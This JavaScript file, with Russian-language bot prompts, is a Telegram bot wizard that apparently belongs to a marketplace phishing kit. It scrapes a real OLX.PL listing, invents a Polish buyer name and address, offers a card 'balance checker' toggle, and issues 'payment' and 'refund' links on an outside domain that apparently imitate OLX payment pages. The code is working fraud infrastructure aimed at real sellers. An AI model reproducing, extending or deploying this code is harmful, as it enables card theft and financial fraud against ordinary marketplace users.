const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const menu = require("../../commands/menu");

const faker = require("faker/locale/pl");

const olx_pl_domains = ["www.olx.pl", "m.olx.pl", "olx.pl"];

const scene = new WizardScene(
  "create_link_olx_pl",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "olx_pl",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, "перешёл к созданию ссылки OLX.PL");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Отправьте ссылку на объявление OLX.PL", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();
      var url;
      try {
        url = new URL(ctx.message.text);
      } catch (err) {
        await ctx.replyOrEdit("❌ Введите валидную ссылку").catch((err) => err);
        return ctx.wizard.prevStep();
      }
      if (!olx_pl_domains.includes(url.host)) {
        await ctx
          .replyOrEdit("❌ Введите ссылку на объявление OLX.PL")
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }
      url.host = url.host
        .replace("m.olx.pl", "olx.pl")
        .replace("olx.pl/oferta", "olx.pl/d/oferta");
      url.hostname = url.host;

      log(ctx, `отправил ссылку для парсинга OLX.PL (${url.href})`);

      await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);
      const ad = await axios.get(encodeURI(url.href)),
        $ = cheerio.load(ad.data);

      const info = {
        title: $('[data-cy="ad_title"]').text().trim(),
        price: $('[data-testid="ad-price-container"]').text().trim(),
        adLink: url.href,
      };
      try {
        info.photo = $(".swiper-zoom-container img").first().attr("src");
      } catch (err) {}

      if (!info.title || !info.price) {
        console.log(err)
        await ctx.scene
          .reply("❌ Не удалось спарсить объявление")
          .catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, `спарсил объявление OLX.PL (${url.href})`);
      ctx.scene.state.data = info;
      var text = `✅ Объявление спарсилось!

Название: <b>${escapeHTML(info.title)}</b>
Цена: <b>${escapeHTML(info.price)}</b>`;

      if (info.photo)
        await ctx
          .replyWithPhoto(
            {
              url: info.photo,
            },
            {
              parse_mode: "HTML",
              caption: text,
            }
          )
          .catch((err) => err);
      else await ctx.reply(text).catch((err) => err);
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите имя покупателя (Формат: Имя Фамилия)", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Автоматическая генерация", "auto")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
        return ctx.wizard.next();
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.callbackQuery.data == "auto") {
        ctx.scene.state.data.name = faker.name.findName();
        await ctx
          .reply(
            `🤖 Сгенерированное имя: <b>${ctx.scene.state.data.name}</b>`,
            {
              parse_mode: "HTML",
            }
          )
          .catch((err) => err);
          // if (!ctx.message.text && ctx.callbackQuery.data != "auto")
          return ctx.wizard.nextStep();
      }
      } catch (e) {
        ctx.scene.state.data.name = ctx.message.text;
        return ctx.wizard.nextStep();
      }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите адрес покупателя", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Автоматическая генерация", "auto")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
        return ctx.wizard.next();
    } catch (err) {
      console.log(`1\n`,err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.callbackQuery.data == "auto") {
        ctx.scene.state.data.address = `${faker.address.cityName()}, ${faker.address.streetAddress()}`;
        await ctx
          .reply(
            `🤖 Сгенерированный адрес: <b>${ctx.scene.state.data.address}</b>`,
            {
              parse_mode: "HTML",
            }
          )
          .catch((err) => err);
          return ctx.wizard.nextStep();
      } else if (!ctx.message.text && ctx.callbackQuery.data != "auto") return ctx.wizard.prevStep();
    } catch (e) {
      ctx.scene.state.data.address = ctx.message.text;
      return ctx.wizard.nextStep();
    }
  },
  async (ctx) => {
    try {
      await ctx
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery.data)) return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep()
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "olx_pl",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "olx_pl",
      });

      log(ctx, `создал объявление OLX.PL <code>(ID: ${ad.id})</code>`);
      await ctx.scene.reply(
        `<b>✅ Ссылка 🇵🇱 OLX.PL сгенерирована!</b>
      
🔗 Получение оплаты: <b>https://${service.domain}/${ad.id}</b>
🔗 Возврат: <b>https://${service.domain}/refund/${ad.id}</b>`,
        {
          parse_mode: "HTML",
        }
      );
      ctx.updateType = "message";
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);

scene.leave(menu);

module.exports = scene;
